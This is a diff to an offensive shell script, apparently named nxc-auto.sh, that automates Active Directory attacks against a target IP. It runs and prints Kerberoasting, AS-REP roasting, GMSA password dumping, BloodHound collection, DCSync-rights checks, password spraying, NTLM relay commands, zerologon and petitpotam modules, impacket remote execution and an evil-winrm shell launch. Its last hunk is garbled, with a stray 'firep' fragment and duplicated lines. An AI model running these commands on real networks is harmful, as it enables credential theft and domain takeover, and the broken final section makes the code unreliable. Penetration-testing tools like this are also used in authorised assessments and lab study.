@@ -32,27 +32,27 @@ BWHITE='\033[1;37m'
 
 # Standardized Logging Functions
 log_info() {
-    echo -e "${BCYAN}ℹ️  [*] $1${NC}"
+    printf "${BCYAN}ℹ️  [*] %s${NC}\n" "$1"
 }
 
 log_success() {
-    echo -e "${BGREEN}✅ [+] $1${NC}"
+    printf "${BGREEN}✅ [+] %s${NC}\n" "$1"
 }
 
 log_warning() {
-    echo -e "${BYELLOW}⚠️  [!] $1${NC}"
+    printf "${BYELLOW}⚠️  [!] %s${NC}\n" "$1"
 }
 
 log_error() {
-    echo -e "${BRED}❌ [-] $1${NC}"
+    printf "${BRED}❌ [-] %s${NC}\n" "$1"
 }
 
 log_cmd() {
-    echo -e "${BMAGENTA}🚀 [>] $1${NC}"
+    printf "${BMAGENTA}🚀 [>] %s${NC}\n" "$1"
 }
 
 log_section() {
-    echo -e "\n${BBLUE}━━━━━━━━━━━━━━━ ${BWHITE}${BOLD}$1${BBLUE} ━━━━━━━━━━━━━━━${NC}"
+    printf "\n${BBLUE}━━━━━━━━━━━━━━━ ${BWHITE}${BOLD}%s${BBLUE} ━━━━━━━━━━━━━━━${NC}\n" "$1"
 }
 
 # Function to check if a port is open (uses bash /dev/tcp)
@@ -556,14 +556,14 @@ check_and_suggest() {
                 log_success "Remote execution tools:"
                 if echo "$output" | grep -q "Pwn3d!"; then
                     log_info "Admin access detected - these tools should work:"
-                    echo "wmiexec.py $IMPACKET_CREDS"
-                    echo "psexec.py $IMPACKET_CREDS"
-                    echo "smbexec.py $IMPACKET_CREDS"
-                    echo "atexec.py $IMPACKET_CREDS"
+                    echo "impacket-wmiexec $IMPACKET_CREDS  # (or wmiexec.py)"
+                    echo "impacket-psexec $IMPACKET_CREDS   # (or psexec.py)"
+                    echo "impacket-smbexec $IMPACKET_CREDS  # (or smbexec.py)"
+                    echo "impacket-atexec $IMPACKET_CREDS   # (or atexec.py)"
                 else
                     log_warning "No admin access - these tools may fail:"
-                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
-                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
+                    echo "impacket-wmiexec $IMPACKET_CREDS  # Requires admin (or wmiexec.py)"
+                    echo "impacket-psexec $IMPACKET_CREDS   # Requires admin (or psexec.py)"
                 fi
                 ;;
             "wmi")
@@ -910,16 +910,16 @@ if [ -n "$hash" ]; then
     SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
     RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
 elif [ -n "$pass" ]; then
-    USER_FLAG="-u $user -p '$pass'"
-    RPC_ARG="-U $domain\\\\$user%'$pass'"
-    SECRETS_ARG="$domain/$user:'$pass'@$IP"
-    RPCDUMP_ARG="-u $user -p '$pass' -d $domain"
+    USER_FLAG="-u $user -p $pass"
+    RPC_ARG="-U $domain\\\\$user%$pass"
+    SECRETS_ARG="$domain/$user:$pass@$IP"
+    RPCDUMP_ARG="-u $user -p $pass -d $domain"
 else
     # Allow for user files or empty creds
-    USER_FLAG="-u '$user' -p ''"
+    USER_FLAG="-u $user -p ''"
     RPC_ARG="-U $domain\\\\$user%"
     SECRETS_ARG="$domain/$user@$IP"
-    RPCDUMP_ARG="-u '$user' -d $domain"
+    RPCDUMP_ARG="-u $user -d $domain"
 fi
 
 # Check for dependencies
@@ -1167,9 +1167,13 @@ if [ "$os_type" = "windows" ]; then
 
     # LDAP domain SID (requires credentials)
     if [ -n "$user" ]; then
-        log_info "Fetching Domain SID..."
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid | tee nxc-enum/ldap/domain-sid.txt
+        if check_port $IP 389 "LDAP"; then
+            log_info "Fetching Domain SID..."
+            print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --timeout 15"
+            timeout 30s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --timeout 15 | tee nxc-enum/ldap/domain-sid.txt
+        else
+            log_warning "Port 389 closed. Skipping LDAP domain SID check."
+        fi
     else
         log_info "Skipping LDAP domain SID (no credentials supplied)"
     fi
@@ -1177,6 +1181,7 @@ else
     log_info "Skipping Windows-specific LDAP/AD checks (target OS: Linux)"
 fi
 
+run_anonymous_enumeration() {
 # Skip Windows-specific anonymous/guest enumeration for Linux
 if [ "$os_type" = "windows" ]; then
     # Guest access (domain optional)
@@ -1612,9 +1617,10 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
             log_info "Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
         fi
         echo ""
-    fi            else
-            log_info "Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)"
-            fi
+    fi
+else
+    log_info "Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)"
+fi
 
 
             # LDAP anonymous checks (Windows-specific)
@@ -1811,6 +1817,33 @@ if echo "$nfs_output" | grep -qE "r--|rw-|rwx" || echo "$showmount_output" | gre
         done < <(echo "$showmount_output" | grep "^/")
     fi
     echo ""
+fi
+
+# FTP Anonymous Access
+if [ "$os_type" = "windows" ] || check_port $IP 21; then
+    log_section "FTP Anonymous Access"
+    if check_port $IP 21; then
+        print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30"
+        ftp_output=$(timeout 60s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30)
+        echo "$ftp_output"
+
+        # Check if anonymous FTP access succeeded and suggest commands
+        if echo "$ftp_output" | grep -q "\[+\]"; then
+            log_success "Anonymous FTP access successful! Suggested commands:"
+            echo "ftp $IP"
+            echo "# Username: anonymous"
+            echo "# Password: anonymous"
+            echo ""
+            log_info "Or use lftp for better features:"
+            echo "lftp -u anonymous,anonymous $IP"
+            echo ""
+            log_info "Download all files recursively:"
+            echo "wget -r ftp://anonymous:anonymous@$IP/"
+            echo ""
+        fi
+    else
+        log_warning "FTP (Port 21) seems closed. Skipping FTP Anonymous Access."
+    fi
 fi
 }
 
@@ -2045,14 +2078,14 @@ check_and_suggest() {
                 log_success "Remote execution tools:"
                 if echo "$output" | grep -q "Pwn3d!"; then
                     log_info "Admin access detected - these tools should work:"
-                    echo "wmiexec.py $IMPACKET_CREDS"
-                    echo "psexec.py $IMPACKET_CREDS"
-                    echo "smbexec.py $IMPACKET_CREDS"
-                    echo "atexec.py $IMPACKET_CREDS"
+                    echo "impacket-wmiexec $IMPACKET_CREDS  # (or wmiexec.py)"
+                    echo "impacket-psexec $IMPACKET_CREDS   # (or psexec.py)"
+                    echo "impacket-smbexec $IMPACKET_CREDS  # (or smbexec.py)"
+                    echo "impacket-atexec $IMPACKET_CREDS   # (or atexec.py)"
                 else
                     log_warning "No admin access - these tools may fail:"
-                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
-                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
+                    echo "impacket-wmiexec $IMPACKET_CREDS  # Requires admin (or wmiexec.py)"
+                    echo "impacket-psexec $IMPACKET_CREDS   # Requires admin (or psexec.py)"
                 fi
                 ;;
             "wmi")
@@ -2163,39 +2196,43 @@ if [ "$os_type" = "windows" ]; then
     fi
     
     # Check for SMB signing status
-    if echo "$smb_output" | grep -q "signing:True"; then
+    clean_smb_output=$(echo "$smb_output" | sed 's/\x1b\[[0-9;]*m//g')
+    if echo "$clean_smb_output" | grep -q "signing:True"; then
         log_warning "SMB Signing is ENABLED"
         log_info "Impact:"
-        echo "  - NTLM relay attacks are NOT possible"
-        echo "  - Man-in-the-middle attacks are prevented"
+        echo "  - NTLM relay attacks to SMB are NOT possible"
         echo "  - SMB traffic is cryptographically signed"
         echo ""
         log_info "What you CAN still do:"
         echo ""
-        log_info "1. Password Spraying:"
+        log_info "1. NTLM Relay to LDAP/MSSQL/HTTP:"
+        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
+        echo "  ntlmrelayx.py -t ldap://$IP --delegate-access"
+        echo ""
+        log_info "2. Password Spraying:"
         echo "nxc smb $IP -u users.txt -p 'Password123' --continue-on-success"
         echo "nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
         echo ""
-        log_info "2. Kerberoasting (extract and crack service account passwords):"
+        log_info "3. Kerberoasting (extract and crack service account passwords):"
         echo "nxc ldap $IP -u '$user' -p '$pass' --kerberoasting kerberoast.txt"
         echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
         echo ""
-        log_info "3. AS-REP Roasting (accounts without pre-auth):"
+        log_info "4. AS-REP Roasting (accounts without pre-auth):"
         echo "GetNPUsers.py $domain/ -usersfile users.txt -no-pass -dc-ip $IP"
         echo ""
-        log_info "4. Enumerate users for further attacks:"
+        log_info "5. Enumerate users for further attacks:"
         echo "nxc smb $IP -u '' -p '' --rid-brute"
         echo "lookupsid.py -no-pass anonymous@$IP"
         echo ""
-        log_info "5. Check for common vulnerabilities:"
+        log_info "6. Check for common vulnerabilities:"
         echo "nxc smb $IP -u '$user' -p '$pass' -M zerologon"
         echo "nxc smb $IP -u '$user' -p '$pass' -M petitpotam"
         echo ""
-        log_info "6. LDAP enumeration and attacks:"
+        log_info "7. LDAP enumeration and attacks:"
         echo "nxc ldap $IP -u '$user' -p '$pass' --bloodhound -c All"
         echo "nxc ldap $IP -u '$user' -p '$pass' --users --admin-count"
         echo ""
-    elif echo "$smb_output" | grep -q "signing:False"; then
+    elif echo "$clean_smb_output" | grep -q "signing:False"; then
         log_success "SMB Signing is DISABLED - NTLM relay attacks possible!"
         log_info "Exploitation suggestions:"
         echo "  # NTLM Relay to SMB:"
@@ -2366,7 +2403,7 @@ if [ "$os_type" = "windows" ]; then
     
         log_section "Admin User Count"
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count  --timeout 15 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
     
         log_section "RID Brute Force"
         print_cmd "nxc smb $IP $USER_FLAG --rid-brute"
@@ -2374,7 +2411,7 @@ if [ "$os_type" = "windows" ]; then
     
         log_section "Domain Groups"
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups  --timeout 15 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
     
         log_section "Local Groups"
         print_cmd "nxc smb $IP $USER_FLAG --local-groups"
@@ -2401,7 +2438,7 @@ if [ "$os_type" = "windows" ]; then
     if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
         log_section "GMSA Passwords"
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa  --timeout 15 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
     
         log_section "Anti-Virus Check"
         print_cmd "nxc smb $IP $USER_FLAG -M enum_av"
@@ -2420,10 +2457,10 @@ if [ "$os_type" = "windows" ]; then
         
         if [ -n "$pass" ]; then
             print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$pass\" -o nxc-enum/ldap/ldd ldap://$IP"
-            unbuffer ldapdomaindump -u "$ldd_user" -p "$pass" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
+            timeout 120s unbuffer ldapdomaindump -u "$ldd_user" -p "$pass" -o nxc-enum/ldap/ldd ldap://$IP 2>&1 | tee nxc-enum/ldap/ldapdomaindump.log
         elif [ -n "$hash" ]; then
             print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$hash\" -o nxc-enum/ldap/ldd ldap://$IP"
-            unbuffer ldapdomaindump -u "$ldd_user" -p "$hash" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
+            timeout 120s unbuffer ldapdomaindump -u "$ldd_user" -p "$hash" -o nxc-enum/ldap/ldd ldap://$IP 2>&1 | tee nxc-enum/ldap/ldapdomaindump.log
         fi
 
         if [ -f nxc-enum/ldap/ldd/index.html ]; then
@@ -2431,28 +2468,28 @@ if [ "$os_type" = "windows" ]; then
         fi
     
         log_info "Machine Account Quota (maq)"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M maq"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M maq"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M maq  --timeout 15 2>/dev/null | tee nxc-enum/ldap/maq.txt
     
         log_info "ADCS Templates"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M adcs"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M adcs"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M adcs  --timeout 15 2>/dev/null | tee nxc-enum/ldap/adcs.txt
     
         log_info "User Descriptions"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M get-desc-users"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M get-desc-users"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M get-desc-users  --timeout 15 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
     
         log_info "LDAP Checker"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M ldap-checker"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M ldap-checker"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M ldap-checker  --timeout 15 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
     
         log_info "Password Not Required"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --password-not-required"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --password-not-required"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --password-not-required  --timeout 15 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
     
         log_info "Trusted For Delegation"
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --trusted-for-delegation"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --trusted-for-delegation"
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --trusted-for-delegation  --timeout 15 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
     
         log_section "AD CS Enumeration (Certipy)"
         # Check if certipy is in PATH, if not check distinct location
@@ -2499,7 +2536,7 @@ if [ "$os_type" = "windows" ]; then
         log_section "Kerberoasting"
         rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt  --timeout 15 2>/dev/null
         if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
             log_success "Kerberoast hashes found! Saved to ${BWHITE}kerberoasting.txt${NC}"
@@ -2527,7 +2564,7 @@ if [ "$os_type" = "windows" ]; then
         log_section "AS-REProasting (LDAP)"
         rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt  --timeout 15 2>/dev/null
         if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
             log_success "AS-REP hashes found! Saved to ${BWHITE}asreproasting.txt${NC}"
@@ -2555,7 +2592,7 @@ if [ "$os_type" = "windows" ]; then
         log_section "BloodHound Data Collection"
         log_info "Collecting all data (-c all)..."
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP"
-        bh_output=$(unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
+        bh_output=$(timeout 120s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
         echo "$bh_output"
         
         # Extract zip filename and suggest next steps
@@ -2572,7 +2609,7 @@ if [ "$os_type" = "windows" ]; then
     if [ -n "$user" ]; then
         log_section "Domain Controllers"
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
     
         log_section "SMB Module Enumeration"
     
@@ -2771,30 +2808,10 @@ else
     log_warning "Skipping SSH/FTP Enumeration (no username supplied)"
 fi
 
-# FTP Unauthenticated / Anonymous & Banner Grab (Check for ProFTPD Exploit)
-log_section "FTP Unauthenticated & Exploit Check"
+# FTP Unauthenticated / Banner Grab (Check for ProFTPD Exploit)
+log_section "FTP Banner Grab & Exploit Check"
 if check_port $IP 21; then
     log_success "FTP port 21 is OPEN!"
-
-    log_info "FTP Anonymous Access"
-    print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30"
-    ftp_output=$(timeout 60s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30)
-    echo "$ftp_output"
-
-    # Check if anonymous FTP access succeeded and suggest commands
-    if echo "$ftp_output" | grep -q "\[+\]"; then
-        log_success "Anonymous FTP access successful! Suggested commands:"
-        echo "ftp $IP"
-        echo "# Username: anonymous"
-        echo "# Password: anonymous"
-        echo ""
-        log_info "Or use lftp for better features:"
-        echo "lftp -u anonymous,anonymous $IP"
-        echo ""
-        log_info "Download all files recursively:"
-        echo "wget -r ftp://anonymous:anonymous@$IP/"
-        echo ""
-    fi
 
     # Grab banner
     log_info "FTP Banner:"
@@ -2867,7 +2884,7 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
 
     log_info "Administrator's ACE"
     print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
-    unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
+    timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
 
     # Build domain DN from domain name
     if [ -n "$domain" ]; then
@@ -2876,7 +2893,7 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
 
         log_info "DCSync Rights"
         print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
+        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
 
         log_info "What these checks reveal:"
         echo "  - Administrator ACE: Shows who can modify the Administrator account"
@@ -2939,16 +2956,6 @@ if [ "$os_type" = "windows" ] && { check_port $IP 5985 || check_port $IP 5986; }
         fi
 
         if echo "$val_out" | grep -q "+"; then
-            log_success "Success! Launching shell..."
-            evil-winrm $WINRM_CREDS
-        else
-            log_error "Error: Username or password are wrong for WinRM access on $IP"
-            log_warning "(Note: Also possible that WinRM timed out - increased limit to 120s)"
-        fi
-    else
-        log_warning "WinRM is open, but no valid credentials were provided or discovered."
-    fi
-firep -q "+"; then
             log_success "Success! Launching shell..."
             evil-winrm $WINRM_CREDS
         else
